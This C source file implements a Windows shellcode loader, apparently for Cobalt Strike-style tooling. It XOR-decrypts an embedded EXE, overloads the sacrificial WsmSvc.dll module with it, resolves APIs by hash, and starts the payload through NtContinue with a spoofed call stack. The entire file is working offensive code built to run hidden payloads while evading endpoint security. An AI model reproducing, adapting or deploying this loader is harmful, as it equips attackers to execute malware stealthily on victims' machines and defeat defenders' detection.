/**
 * Console EXE to Shellcode Loader - WsmSvc Edition
 * 
 * Converts Windows console EXE files to position-independent shellcode
 * that executes via sacrificial WsmSvc DLL injection.
 * 
 * Features:
 * - XOR encryption of embedded EXE payload
 * - WsmSvc sacrificial DLL module overloading
 * - Section permission management
 * - IAT resolution and hooking
 * - NtContinue-based stack spoofing
 * - Command-line argument parsing
 */

#include <winsock2.h>
#include <windows.h>
#include "tcglib/loaderdefs.h"
#include "tcglib/loader.h"
#include "definitions.h"
#include "draugr/spoof.h"

/* ── Windows API Declarations ──────────────────────────────────────── */

WINBASEAPI HANDLE   WINAPI KERNEL32$CreateFileW         (LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI BOOL     WINAPI KERNEL32$CloseHandle         (HANDLE);
WINBASEAPI BOOL     WINAPI KERNEL32$VirtualProtect      (LPVOID, SIZE_T, DWORD, PDWORD);
WINBASEAPI LPVOID   WINAPI KERNEL32$VirtualAlloc        (LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL     WINAPI KERNEL32$VirtualFree         (LPVOID, SIZE_T, DWORD);
WINBASEAPI HMODULE  WINAPI KERNEL32$GetModuleHandleA    (LPCSTR);

NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtCreateSection    (PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtMapViewOfSection (HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtClose            (HANDLE);
NTSYSCALLAPI VOID     NTAPI NTDLL$RtlCaptureContext  (PCONTEXT);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtContinue         (PCONTEXT, BOOLEAN);
NTSYSCALLAPI void*    NTAPI NTDLL$memset             (void*, int, size_t);
NTSYSCALLAPI void*    NTAPI NTDLL$memcpy             (void*, const void*, size_t);

extern PVOID calculate_function_stack_size_wrapper(PVOID return_address);

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/* ── Crystal Palace embedded sections ──────────────────────────────── */

char __EXEDATA__ [0] __attribute__((section("cobalt_dll")));
char __MASKDATA__[0] __attribute__((section("cobalt_mask")));

static char * findAppendedEXE() { return (char *)&__EXEDATA__;  }
static char * findMask()        { return (char *)&__MASKDATA__; }

/* ── ROR-13 Hash Helpers ───────────────────────────────────────────── */

#define KERNEL32DLL_HASH      0x6A4ABC5B
#define LOADLIBRARYA_HASH     0xEC0E4E8E
#define GETPROCADDRESS_HASH   0x7C0DFCAA
#define GETMODULEHANDLEA_HASH 0xD3324904

#define WIN32_FUNC(x) __typeof__(x) * x
typedef struct { 
    WIN32_FUNC(LoadLibraryA); 
    WIN32_FUNC(GetProcAddress); 
    WIN32_FUNC(GetModuleHandleA); 
    WIN32_FUNC(VirtualAlloc);
    WIN32_FUNC(VirtualProtect);
} WIN32FUNCS;

void findNeededFunctions(WIN32FUNCS * funcs) {
    char * hModule          = (char *)findModuleByHash(KERNEL32DLL_HASH);
    funcs->LoadLibraryA     = (__typeof__(LoadLibraryA)    *) findFunctionByHash(hModule, LOADLIBRARYA_HASH);
    funcs->GetProcAddress   = (__typeof__(GetProcAddress)  *) findFunctionByHash(hModule, GETPROCADDRESS_HASH);
    funcs->GetModuleHandleA = (__typeof__(GetModuleHandleA)*) findFunctionByHash(hModule, GETMODULEHANDLEA_HASH);
}

/* ── PE Context for Console EXE Execution ──────────────────────────── */

typedef struct {
    DLLDATA         pe_data;
    PVOID           base_address;
    SIZE_T          image_size;
    DWORD           entry_point_rva;
    LPSTR           command_line;
    int             argc;
    char*           argv[256];
} PE_CONTEXT;

/* ── Parse Command Line into argc/argv ─────────────────────────────── */

static void parse_command_line(PE_CONTEXT* ctx, const char* cmdline) {
    NTDLL$memset(ctx->argv, 0, sizeof(ctx->argv));
    
    if (!cmdline || !cmdline[0]) {
        ctx->argc = 1;
        ctx->argv[0] = "app.exe";
        return;
    }

    /* Allocate a buffer to work with */
    char* cmd_buf = (char*)KERNEL32$VirtualAlloc(NULL, 16384, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!cmd_buf) {
        ctx->argc = 1;
        ctx->argv[0] = "app.exe";
        return;
    }

    /* Calculate command line length */
    int cmdlen = 0;
    while (cmdline[cmdlen] && cmdlen < 16000) cmdlen++;

    /* Copy to working buffer */
    NTDLL$memcpy(cmd_buf, cmdline, cmdlen);
    cmd_buf[cmdlen] = '\0';

    /* Parse arguments: split by spaces, handle quotes */
    ctx->argv[0] = "app.exe";
    int argv_idx = 1;
    int i = 0;

    while (i < cmdlen && argv_idx < 255) {
        /* Skip leading whitespace */
        while (i < cmdlen && (cmd_buf[i] == ' ' || cmd_buf[i] == '\t')) i++;

        if (i >= cmdlen) break;

        /* Check for quoted string */
        if (cmd_buf[i] == '"') {
            i++;
            int arg_start = i;
            while (i < cmdlen && cmd_buf[i] != '"') i++;
            cmd_buf[i] = '\0';
            ctx->argv[argv_idx++] = &cmd_buf[arg_start];
            i++; /* skip closing quote */
        } else {
            /* Unquoted argument */
            int arg_start = i;
            while (i < cmdlen && cmd_buf[i] != ' ' && cmd_buf[i] != '\t') i++;
            cmd_buf[i] = '\0';
            ctx->argv[argv_idx++] = &cmd_buf[arg_start];
            i++;
        }
    }

    ctx->argv[argv_idx] = NULL;
    ctx->argc = argv_idx;
}

/* ── Load Sacrificial DLL (WsmSvc) ─────────────────────────────────── */

BOOL LoadSacrificialDll(IN LPCWSTR szDllFilePath, OUT HMODULE * phModule) {
    HANDLE   hFile    = INVALID_HANDLE_VALUE;
    HANDLE   hSection = NULL;
    NTSTATUS status   = 0;
    PVOID    mapped   = NULL;
    SIZE_T   viewSize = 0;

    hFile = KERNEL32$CreateFileW(szDllFilePath, GENERIC_READ, FILE_SHARE_READ,
                                  NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    status = NTDLL$NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                                    NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    KERNEL32$CloseHandle(hFile);
    if (!NT_SUCCESS(status)) return FALSE;

    status = NTDLL$NtMapViewOfSection(hSection, (HANDLE)-1, &mapped,
                                       0, 0, NULL, &viewSize,
                                       ViewShare, 0, PAGE_READWRITE);
    NTDLL$NtClose(hSection);

    if (!NT_SUCCESS(status) || !mapped) return FALSE;
    *phModule = (HMODULE)mapped;
    return TRUE;
}

/* ── Transfer Execution via NtContinue (Stack Spoofing) ───────────── */

VOID TransferExecutionViaStack(PVOID entry_point, PVOID hInstance, int argc, char** argv) {
    PVOID kernel32 = KERNEL32$GetModuleHandleA("kernel32.dll");
    PVOID ntdll    = KERNEL32$GetModuleHandleA("ntdll.dll");

    PVOID  BaseThreadInitThunk = GetProcAddress((HMODULE)kernel32, "BaseThreadInitThunk");
    PVOID  RtlUserThreadStart  = GetProcAddress((HMODULE)ntdll,    "RtlUserThreadStart");
    PVOID  btit_ret        = (PVOID)((ULONG_PTR)BaseThreadInitThunk + 0x17);
    PVOID  ruts_ret        = (PVOID)((ULONG_PTR)RtlUserThreadStart  + 0x2c);
    SIZE_T btit_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(btit_ret);
    SIZE_T ruts_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(ruts_ret);

    if (!btit_stack_size || !ruts_stack_size) return;

    PVOID fake_stack = KERNEL32$VirtualAlloc(NULL, 0x40000,
                                              MEM_COMMIT | MEM_RESERVE,
                                              PAGE_READWRITE);
    if (!fake_stack) return;

    ULONG_PTR rsp = ((ULONG_PTR)fake_stack + 0x40000) & ~(ULONG_PTR)0xF;
    rsp -= 8; *(PVOID *)rsp = NULL;
    rsp -= ruts_stack_size; *(PVOID *)rsp = ruts_ret;
    rsp -= btit_stack_size; *(PVOID *)rsp = btit_ret;

    CONTEXT ctx;
    NTDLL$memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    NTDLL$RtlCaptureContext(&ctx);
    ctx.Rip = (DWORD64)entry_point;
    ctx.Rsp = (DWORD64)rsp;
    /* Console main(int argc, char* argv[]) */
    ctx.Rcx = (DWORD64)argc;
    ctx.Rdx = (DWORD64)argv;
    ctx.R8  = 0;

    NTDLL$NtContinue(&ctx, FALSE);
}

/* ── Fix Section Permissions ───────────────────────────────────────── */

void fix_section_permissions(DLLDATA * dll, char * src, char * dst) {
    DWORD                  section_count = dll->NtHeaders->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * section_hdr   = NULL;
    void                 * section_dst   = NULL;
    DWORD                  section_size  = 0;
    DWORD                  new_protect   = 0;
    DWORD                  old_protect   = 0;

    section_hdr = (IMAGE_SECTION_HEADER *) PTR_OFFSET(dll->OptionalHeader, dll->NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (int i = 0; i < section_count; i++) {
        if (!section_hdr->SizeOfRawData || !section_hdr->VirtualAddress) {
            section_hdr++;
            continue;
        }

        section_dst  = dst + section_hdr->VirtualAddress;
        section_size = section_hdr->SizeOfRawData;
        new_protect  = 0;

        if (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE)
            new_protect = PAGE_WRITECOPY;
        if (section_hdr->Characteristics & IMAGE_SCN_MEM_READ)
            new_protect = PAGE_READONLY;
        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
            new_protect = PAGE_READWRITE;
        if (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE)
            new_protect = PAGE_EXECUTE;
        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE))
            new_protect = PAGE_EXECUTE_WRITECOPY;
        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_READ))
            new_protect = PAGE_EXECUTE_READ;
        if ((section_hdr->Characteristics & IMAGE_SCN_MEM_READ) && (section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE) && (section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE))
            new_protect = PAGE_EXECUTE_READWRITE;

        KERNEL32$VirtualProtect(section_dst, section_size, new_protect, &old_protect);
        section_hdr++;
    }
}

/* ── Module Overload: Load EXE into WsmSvc ─────────────────────────── */

void ModuleOverloadEXE(IN LPCWSTR SacrificialDllPath) {
    HMODULE hSacrificial = NULL;
    DLLDATA exeData;
    DWORD   oldProt = 0;

    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = LoadLibraryA;
    funcs.GetProcAddress = GetProcAddress;

    /* XOR-decrypt EXE */
    RESOURCE * masked_exe = (RESOURCE *)findAppendedEXE();
    RESOURCE * mask_key   = (RESOURCE *)findMask();

    char * exe_raw_src = KERNEL32$VirtualAlloc(NULL, masked_exe->len,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
    if (!exe_raw_src) return;

    for (int i = 0; i < masked_exe->len; i++)
        exe_raw_src[i] = masked_exe->value[i] ^ mask_key->value[i % mask_key->len];

    ParseDLL(exe_raw_src, &exeData);

    /* Load sacrificial DLL (WsmSvc) */
    if (!LoadSacrificialDll(SacrificialDllPath, &hSacrificial)) {
        KERNEL32$VirtualFree(exe_raw_src, 0, MEM_RELEASE);
        return;
    }

    /* Size check — sacrificial DLL must fit EXE's full image */
    PIMAGE_NT_HEADERS pSacNt = (PIMAGE_NT_HEADERS)(
        (ULONG_PTR)hSacrificial +
        ((PIMAGE_DOS_HEADER)hSacrificial)->e_lfanew);
    SIZE_T sacrificialSize = (SIZE_T)pSacNt->OptionalHeader.SizeOfImage;
    SIZE_T exeSize         = (SIZE_T)SizeOfDLL(&exeData);

    if (exeSize > sacrificialSize) {
        KERNEL32$VirtualFree(exe_raw_src, 0, MEM_RELEASE);
        return;
    }

    /* Make sacrificial memory writable */
    KERNEL32$VirtualProtect(hSacrificial, 0x1000, PAGE_READWRITE, &oldProt);

    PIMAGE_SECTION_HEADER pSacSec = IMAGE_FIRST_SECTION(pSacNt);
    for (DWORD i = 0; i < pSacNt->FileHeader.NumberOfSections; i++) {
        if (!pSacSec[i].VirtualAddress) continue;
        SIZE_T secSize = pSacSec[i].SizeOfRawData ? pSacSec[i].SizeOfRawData : pSacSec[i].Misc.VirtualSize;
        if (!secSize) continue;
        KERNEL32$VirtualProtect(
            (PVOID)((ULONG_PTR)hSacrificial + pSacSec[i].VirtualAddress),
            secSize, PAGE_READWRITE, &oldProt);
    }

    /* Zero target region */
    NTDLL$memset((char *)hSacrificial, 0, exeSize);

    /* Copy EXE — LoadDLL handles headers, sections, relocations */
    LoadDLL(&exeData, exe_raw_src, (char *)hSacrificial);

    /* Fix section permissions */
    fix_section_permissions(&exeData, exe_raw_src, (char *)hSacrificial);

    /* Protect headers RO */
    KERNEL32$VirtualProtect(hSacrificial,
                             exeData.OptionalHeader->SizeOfHeaders,
                             PAGE_READONLY, &oldProt);

    /* Resolve imports */
    ProcessImports(&funcs, &exeData, (char *)hSacrificial);

    /* Get entry point */
    PVOID entry = (PVOID)((ULONG_PTR)hSacrificial + exeData.OptionalHeader->AddressOfEntryPoint);

    /* Get command line argument from macro (set during compilation) */
    #ifndef EXE_CMDLINE
    #define EXE_CMDLINE ""
    #endif

    /* Parse command line into argc/argv */
    PE_CONTEXT ctx;
    NTDLL$memset(&ctx, 0, sizeof(ctx));
    parse_command_line(&ctx, EXE_CMDLINE);

    /* Free decrypted buffer */
    KERNEL32$VirtualFree(exe_raw_src, 0, MEM_RELEASE);

    /* Transfer execution via stack spoofing */
    TransferExecutionViaStack(entry, hSacrificial, ctx.argc, ctx.argv);
}

/* ── Entry point ───────────────────────────────────────────────────── */

__attribute__((noinline, no_reorder)) void go() {
    ModuleOverloadEXE(L"C:\\Windows\\System32\\WsmSvc.dll");
}

FARPROC resolve(DWORD modHash, DWORD funcHash) {
    HANDLE hModule = findModuleByHash(modHash);
    return findFunctionByHash(hModule, funcHash);
}
